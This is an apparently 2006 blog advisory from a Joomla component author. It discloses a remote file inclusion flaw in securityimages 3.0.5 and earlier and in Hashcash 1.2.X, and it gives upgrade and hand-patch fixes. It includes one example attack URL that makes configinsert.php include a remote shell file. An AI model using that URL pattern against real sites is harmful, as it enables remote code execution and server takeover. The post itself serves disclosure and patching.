---
id: 2669
title: 'Security risk in securityimages'
date: '2006-08-01T19:58:39+02:00'
author: 'Cédric Walter'

guid: 'https://waltercedric.com/new/?p=2669'
permalink: /joomla/security-risk-in-securityimages/
image: /wp-content/uploads/2006/08/thumb-hacker.jpg
tags:
    - joomla
    - securityimages
---

  
| ![](/assets/images/2006/08/thumb-hacker.jpg) | The webmaster of janwiersma.com sent me an email today    at 6:12AM , his server was hacked because of a bug in    securityimages. This bug allows a <span style="font-weight: bold;">remote atacker to    execute commands via remote forceful include and    execute function on your server    <span style="font-weight: bold; color: rgb(255, 0, 0);">and affect ALL version of securityimages &lt;= 3.0.5Here are all files which put your server at risk:   <span style="font-style: italic;">client.php, <span style="font-style: italic;">configinsert.php, <span style="font-style: italic;">lang.php, <span style="font-style: italic;">server.php  <span style="font-weight: bold;">Example of attack:   http://web/components/com\_securityimages/   configinsert.php?mosConfig\_absolute\_path=http://shell.txt   from http://securityreason.com/exploitalert/892   Secunia has also a report on it: http://secunia.com/product/11186/ |
|---|---|
| In fact I forget to use that line in these files:   <span style="font-style: italic;">defined(‘\_VALID\_MOS’) or die(‘Direct Access to this location is not allowed.’);   This avoid any requests to access directly this file.<font size="3" style="color: rgb(255, 0, 0); font-weight: bold; background-color: rgb(255, 255, 0);"> – upgrade to 3.0.6 (download at #Joomla Forge or in my download sections) OR   – patch the faulty files by hand (add <span style="font-style: italic;">defined(‘\_VALID\_MOS’) or die(‘Direct Access to this location is not allowed.’); at the beginning of each file)  Please also contact all Your friends which are using securityimages!  <span style="font-weight: bold;">And for my other components?  <span style="background-color: rgb(255, 255, 0); color: rgb(255, 0, 0); font-weight: bold;">Hashcash 1.2.X is also affected: http://secunia.com/product/11046/ and my patch is avalaible!<span style="background-color: rgb(255, 255, 0); color: rgb(255, 0, 0); font-weight: bold;">  – upgrade to 1.2.2 (download at #Joomla Forge or in my download sections) <span style="font-weight: bold;">OR   – patch the faulty files by hand (add <span style="font-style: italic;">defined(‘\_VALID\_MOS’) or die(‘Direct Access to this location is not allowed.’); at the beginning of each file)   <span style="background-color: rgb(255, 255, 0); color: rgb(255, 0, 0); font-weight: bold;">   JoomlaCloud is NOT affected   <span style="background-color: rgb(255, 255, 0); color: rgb(255, 0, 0); font-weight: bold;"> |

<font size="3" style="color: rgb(255, 0, 0); font-weight: bold; background-color: rgb(255, 255, 0);">YOU ARE ALL URGE TO UPGRADE ASAP!